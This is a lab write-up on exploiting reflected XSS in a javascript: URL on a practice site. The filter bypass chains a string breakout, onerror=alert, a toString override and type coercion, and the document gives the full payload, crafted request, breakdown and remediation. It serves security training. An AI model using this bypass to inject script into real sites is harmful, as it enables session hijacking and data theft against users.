# Lab: Reflected XSS in a JavaScript URL with some characters blocked

**Difficulty:** Expert  
**Vulnerability:** Reflected Cross-Site Scripting (XSS)  
**Context:** JavaScript URL / JavaScript String  
**Result:** Successful execution of `alert(1337)`

--- 

## 1. Summary

The application was vulnerable to Reflected Cross-Site Scripting (XSS) through a JavaScript URL generated using the `postId` parameter.

The application reflected user-controlled input inside a JavaScript string used as the body of a `fetch()` request.

Although the application attempted to prevent XSS by filtering certain characters, including parentheses and spaces, the restrictions could be bypassed using alternative JavaScript syntax and implicit function invocation.

The vulnerability was successfully exploited by:

- Breaking out of the existing JavaScript string.
- Creating an arrow function containing a `throw` statement.
- Assigning the arrow function to the global `toString` property.
- Triggering implicit function invocation through JavaScript type coercion.
- Using `onerror = alert` to execute the alert function without parentheses.

The lab was solved when an alert containing `1337` was triggered.

## 2. Identifying the Injection Point

The initial request was:

```http
GET /post?postId=4 HTTP/1.1
Host: TARGET
```

The application reflected the request URL inside the `href` attribute of the "Back to Blog" link.

Original response:

```html
<a href="javascript:fetch('/analytics', {
    method:'post',
    body:'/post%3fpostId%3d4'
}).finally(_ => window.location = '/')">
    Back to Blog
</a>
```

This revealed that the application was constructing a JavaScript URL using user-controlled input.

The important injection point was:

```javascript
body:'/post%3fpostId%3d4'
```

The reflected URL was placed inside a single-quoted JavaScript string.

## 3. Testing Character Filtering

To understand the application's filtering behavior, different characters were supplied through the `postId` parameter.

Observed behavior:

| Character | Behavior |
|---|---|
| Single quote `'` | URL-encoded as `%27` |
| Double quote `"` | Remained unchanged |
| Parentheses `()` | Blocked |
| Square brackets `[]` | Blocked |
| Curly braces `{}` | Remained unchanged |
| Forward slash `/` | Remained unchanged |
| Backslash `\` | Blocked |
| Backticks `` ` `` | Blocked |
| Semicolon `;` | URL-encoded as `%3b` |

This indicated that conventional JavaScript payloads such as `alert(1337)` would not work directly.

The challenge was to bypass the restrictions without relying on blocked characters.

## 4. Exploitation Technique

### Step 1: Breaking out of the JavaScript string

The original JavaScript contained a single-quoted string:

```javascript
body:'USER_INPUT'
```

The payload used `%27`, which represents a single quote after URL decoding.

This allowed the injected input to terminate the existing string.

The payload also used `}` to close the original `fetch()` options object.

### Step 2: Creating an arrow function

The following JavaScript was injected:

```javascript
x=x=>{throw/**/onerror=alert,1337}
```

This creates an arrow function and assigns it to the variable `x`.

The function contains:

```javascript
throw onerror=alert,1337
```

The comma operator evaluates its expressions from left to right and returns the final expression's value.

Therefore:

1. `onerror = alert` assigns the alert function as the global error handler.
2. `1337` becomes the value thrown by the `throw` statement.

The comment `/**/` was used as a whitespace alternative because ordinary spaces were blocked.

At this point, the function was created but had not yet executed.

### Step 3: Replacing the global toString function

The next part was:

```javascript
toString=x
```

In the browser's global environment, `toString` refers to the global object's `toString` property.

Assigning `x` replaces the existing `window.toString` method with the injected arrow function.

Conceptually:

```javascript
window.toString = x
```

Now the custom function is assigned to the object's string-conversion method.

### Step 4: Triggering implicit function invocation

The payload then used:

```javascript
window+''
```

JavaScript must convert the `window` object into a primitive value before performing string concatenation.

During this conversion, JavaScript invokes the object's string-conversion method.

Since `window.toString` was replaced with the injected arrow function, the function executes implicitly.

This avoids the need to write conventional function-call parentheses.

The function executes:

```javascript
throw 1337
```

### Step 5: Triggering alert through the error handler

Previously, the payload assigned:

```javascript
onerror = alert
```

When the thrown value generates an uncaught error, the global error handler is invoked.

Because the handler references `alert`, the browser displays an alert containing the error message, including `1337`.

This achieves the lab's objective without directly writing:

```javascript
alert(1337)
```

## 5. Proof of Concept (PoC)

### Full payload

Append the following payload to the `postId` parameter:

```text
2&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

### Full request

Replace `TARGET` with the actual lab hostname:

```http
GET /post?postId=2&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 HTTP/1.1
Host: TARGET
```

### Decoded JavaScript payload

After the relevant URL decoding, the injected JavaScript structure becomes:

```javascript
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

### Resulting JavaScript structure

The complete JavaScript URL becomes structurally equivalent to:

```javascript
javascript:fetch('/analytics', {
    method:'post',
    body:'/post?postId=2&'
},
x=x=>{throw/**/onerror=alert,1337},
toString=x,
window+'',
{x:''}
).finally(_ => window.location = '/')
```

### Execution steps

1. Open the crafted URL in the lab.
2. Scroll to the bottom of the post page.
3. Click the **Back to Blog** link.
4. The JavaScript URL executes.
5. The implicit string conversion invokes the injected function.
6. The thrown error triggers the global error handler.
7. An alert containing `1337` appears.

**Expected result:** An alert dialog containing `1337`.

## 6. Payload Breakdown

| Payload component | Purpose |
|---|---|
| `2` | Supplies a valid post ID |
| `&` | Separates the original parameter from the injected content |
| `%27` | Decodes to a single quote and terminates the original JavaScript string |
| `}` | Closes the original fetch options object |
| `x=x=>{...}` | Creates and assigns an arrow function |
| `throw` | Generates an exception |
| `/**/` | Replaces a blocked whitespace character |
| `onerror=alert` | Assigns the alert function as the global error handler |
| `,1337` | Supplies the value used by the thrown expression |
| `toString=x` | Replaces the global object's string-conversion method |
| `window%2b%27%27` | Decodes to `window+''`, triggering implicit string conversion |
| `,{x:%27` | Starts a dummy object and reopens a string to preserve the original JavaScript syntax |

## 7. Why the Dummy Object Was Necessary

The original JavaScript contained:

```javascript
}).finally(_ => window.location = '/')
```

After breaking out of the original options object, the injected code had to preserve the syntax of the remaining JavaScript.

The payload ended with:

```javascript
,{x:'
```

The original code then supplied the closing quote and brace, producing:

```javascript
{x:''}
```

This is a valid JavaScript object literal.

The dummy object was not responsible for executing the XSS. Its purpose was to ensure that the remaining original JavaScript could still be parsed.

## 8. Root Cause

The root cause was the unsafe construction of a JavaScript URL using user-controlled input.

The application reflected user input directly into executable JavaScript without applying context-appropriate protection.

Character filtering was insufficient because it attempted to block specific syntax rather than preventing untrusted input from becoming executable JavaScript.

## 9. Security Impact

Depending on the application's context and how the vulnerable link is delivered and activated, successful exploitation could allow an attacker to execute JavaScript in a victim's browser under the application's origin.

Potential consequences include:

- Unauthorized actions performed through the victim's authenticated session.
- Access to sensitive information exposed to page JavaScript.
- Modification of page content.
- Phishing or malicious UI manipulation.
- Abuse of application functionality available to the victim.

Actual impact depends on the application's security controls and accessible data.

## 10. Remediation

Recommended security measures:

1. Avoid dynamically constructing `javascript:` URLs using user-controlled input.
2. Replace JavaScript URLs with normal navigation links and safe event handling.
3. Keep untrusted input out of executable JavaScript contexts.
4. Apply context-appropriate output encoding.
5. Validate `postId` as a strictly numeric identifier on the server.
6. Implement a restrictive Content Security Policy (CSP) as an additional defense.

## 11. Key Takeaways

- Reflected input inside a JavaScript URL can create an XSS vulnerability.
- Character filtering is not a reliable XSS defense.
- JavaScript arrow functions can contain `throw` statements.
- The global `onerror` handler can be used to invoke a function when an uncaught error occurs.
- JavaScript type coercion can cause implicit method invocation.
- Overriding `toString` can change how an object behaves during string conversion.
- Preserving the surrounding JavaScript syntax is essential when injecting code into an existing expression.

**Main lesson:** Effective XSS testing requires understanding the execution context, JavaScript parsing behavior, and alternative execution mechanisms rather than relying only on conventional payloads.
